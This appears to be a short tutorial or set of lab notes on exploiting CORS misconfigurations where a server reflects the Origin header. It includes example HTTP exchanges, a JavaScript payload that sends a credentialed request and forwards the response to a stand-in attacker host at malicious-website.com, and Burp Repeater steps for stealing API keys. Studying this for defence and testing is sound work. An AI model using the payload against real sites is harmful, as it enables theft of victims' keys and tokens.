# Methods to exploit CORS.


## Server-generated ACAO header from client-specified Origin header

- Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.

- One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:

```javascript
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```
It then responds with:

```javascript
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

- These headers state that access is allowed from the requesting domain (malicious-website.com) and that the cross-domain requests can include cookies (Access-Control-Allow-Credentials: true) and so will be processed in-session.

- Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='//malicious-website.com/log?key='+this.responseText;
}; 
```

>  CORS vulnerability with basic origin reflection

1. Check if the request responses with "Access-Control-Allow-Credential" if it's true then move on to next step.
2. Send the request to the "Repeater" and add header of your exploit server "Origin: https://www.exploit.com"
3. Now craft your javascript file in the exploit server and exploit it to get user APIs key or sensotive information.
